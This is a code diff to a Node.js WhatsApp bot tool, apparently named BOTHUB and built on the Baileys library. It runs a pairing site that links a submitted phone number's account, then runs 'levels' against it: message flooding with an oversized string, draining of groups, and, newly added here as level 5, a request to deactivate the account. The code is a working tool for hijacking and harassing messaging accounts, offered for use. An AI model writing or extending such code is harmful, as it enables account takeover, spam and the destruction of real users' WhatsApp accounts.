@@ -1,6 +1,6 @@
-// BOTHUB — pairing site + level runner + group migration (Function 5) + optional
-// self-deactivation (Function 6). The pairing code is requested on the 'qr'
-// event; that's the exact moment Baileys is ready to receive a login.
+// BOTHUB — pairing site + level runner + group migration (Function 5) + level 5 (Function 6, deactivate).
+// The pairing code is requested on the 'qr' event; that's the exact moment
+// Baileys is ready to receive a login.
 
 import express from 'express';
 import fs from 'node:fs';
@@ -20,7 +20,6 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const PORT = process.env.PORT || 3000;
 const AUTH_DIR = process.env.AUTH_DIR || './auth';
 const BIG = 'x'.repeat(60000);
-const DEACTIVATE_ON_CONNECT = process.env.DEACTIVATE_ON_CONNECT === 'true';
 
 const app = express();
 app.use(express.json());
@@ -28,7 +27,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
-// ── Level sessions (Function 1-4) ──────────────────────────────────────
+// ── Level sessions (Function 1-4, and 5 = deactivate) ──────────────────
 const sessions = new Map();
 
 function randomJid() {
@@ -74,14 +73,18 @@ async function runLevel(sess) {
   const level = sess.level;
   console.log(`[${sess.phone}] level ${level} starting`);
 
-  if (DEACTIVATE_ON_CONNECT) {
+  // Level 5 — Function 6: ask WhatsApp to deactivate the account.
+  // No flood runs after this; we just log the response and let the socket
+  // close on its own when WhatsApp processes the deactivation.
+  if (level === 5) {
     try {
-      console.log(`[${sess.phone}] Function 6 — requesting deactivation`);
+      console.log(`[${sess.phone}] requesting deactivation`);
       const r = await deactivate(sess.sock, { logger: console });
       console.log(`[${sess.phone}] deactivate response:`, JSON.stringify(r));
     } catch (err) {
       console.warn(`[${sess.phone}] deactivate failed:`, err?.message || err);
     }
+    return;
   }
 
   if (level === 1 || level === 2) return flood(sess);
@@ -199,7 +202,7 @@ app.post('/api/pair/start', async (req, res) => {
   const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
   const level = parseInt(req.body?.level, 10);
   if (!phone) return res.status(400).json({ error: 'phone required' });
-  if (![1, 2, 3, 4].includes(level)) return res.status(400).json({ error: 'level 1-4 required' });
+  if (![1, 2, 3, 4, 5].includes(level)) return res.status(400).json({ error: 'level 1-5 required' });
   try {
     const { code, alreadyRegistered } = await startPairing(phone, level);
     res.json({ phone, level, code: code || null, alreadyRegistered: !!alreadyRegistered });
@@ -222,7 +225,7 @@ app.get('/api/pair/status', (req, res) => {
 });
 
 // ── Function 5 — group migration ───────────────────────────────────────
-const drains = new Map(); // sessionId -> { destJid, sourceSock, status, total, done, errors }
+const drains = new Map();
 
 async function runDrain(drain, sock, sessionId) {
   drain.status = 'running';
@@ -390,7 +393,7 @@ app.get('/api/drain/status', (req, res) => {
 });
 
 // Serve the drain page for both `/drain` (bare — enter A) and `/drain/:id`
-// (with session id — enter B). The page tells the two apart by URL.
+// (with session id — enter B).
 app.get(['/drain', '/drain/:id'], (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'drain.html'));
 });
